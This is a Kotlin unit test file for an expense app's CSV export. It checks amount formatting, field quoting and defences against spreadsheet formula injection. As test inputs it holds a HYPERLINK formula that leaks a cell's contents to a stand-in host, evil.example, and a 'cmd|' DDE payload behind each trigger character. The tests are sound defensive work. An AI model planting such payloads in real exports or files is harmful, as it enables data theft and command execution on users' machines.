package com.expenser.app.data.backup

import com.expenser.app.data.db.entity.CategoryEntity
import com.expenser.app.data.db.entity.TransactionEntity
import com.expenser.app.data.model.EntryType
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class CsvExportTest {

    @Test
    fun `minorToDecimal formats minor units with two places`() {
        assertEquals("12.50", CsvExport.minorToDecimal(1250))
        assertEquals("0.05", CsvExport.minorToDecimal(5))
        assertEquals("100.00", CsvExport.minorToDecimal(10_000))
        assertEquals("-0.05", CsvExport.minorToDecimal(-5))
    }

    @Test
    fun `a name that opens with a formula trigger is exported as text`() {
        val payload = "=HYPERLINK(\"http://evil.example?d=\"&A1,\"click\")"
        val csv = CsvExport.transactionsToCsv(backupWithName(payload))
        val cell = csv.trimEnd('\n').split('\n')[1].split(',')[1]

        // Quoted and apostrophe-prefixed, so no spreadsheet evaluates it.
        assertTrue(cell, cell.startsWith("\"'="))
    }

    @Test
    fun `every formula trigger is disarmed`() {
        for (trigger in listOf("=", "+", "-", "@", "\t", "\r")) {
            val csv = CsvExport.transactionsToCsv(backupWithName(trigger + "cmd|'/c calc'!A0"))
            val line = csv.trimEnd('\n').split('\n')[1]
            assertTrue("$trigger not disarmed: $line", line.contains("\"'$trigger"))
        }
    }

    @Test
    fun `a negative amount stays a number`() {
        // The amount column is generated, never user text, so it must not be disarmed -
        // an apostrophe here would stop the spreadsheet totalling the column.
        val data = BackupData(
            categories = emptyList(),
            transactions = listOf(
                TransactionEntity("t1", "Refund", -1250, "c1", "2026-09-05", null, EntryType.Expense, "u"),
            ),
        )

        val cells = CsvExport.transactionsToCsv(data).trimEnd('\n').split('\n')[1].split(',')
        assertEquals("-12.50", cells[2])
    }

    @Test
    fun `an ordinary name is left untouched`() {
        val csv = CsvExport.transactionsToCsv(backupWithName("Coffee"))
        assertEquals("2026-09-05,Coffee,3.50,,Expense,", csv.trimEnd('\n').split('\n')[1])
    }

    private fun backupWithName(name: String) = BackupData(
        categories = emptyList(),
        transactions = listOf(
            TransactionEntity("t1", name, 350, "c1", "2026-09-05", null, EntryType.Expense, "u"),
        ),
    )

    @Test
    fun `csv has a header, resolves category names and quotes tricky fields`() {
        val data = BackupData(
            categories = listOf(CategoryEntity("c1", "Food", EntryType.Expense, null, "u")),
            transactions = listOf(
                TransactionEntity("t1", "Lunch, deli", 1299, "c1", "2026-09-05", "with \"friends\"", EntryType.Expense, "u"),
                TransactionEntity("t2", "Coffee", 350, "c1", "2026-09-07", null, EntryType.Expense, "u"),
            ),
        )

        val csv = CsvExport.transactionsToCsv(data)
        val lines = csv.trimEnd('\n').split('\n')

        assertEquals("Date,Name,Amount,Category,Type,Note", lines[0])
        // Sorted by date descending: 09-07 before 09-05.
        assertEquals("2026-09-07,Coffee,3.50,Food,Expense,", lines[1])
        // Name has a comma and the note has quotes, so both are CSV-quoted/escaped.
        assertEquals("2026-09-05,\"Lunch, deli\",12.99,Food,Expense,\"with \"\"friends\"\"\"", lines[2])
    }
}
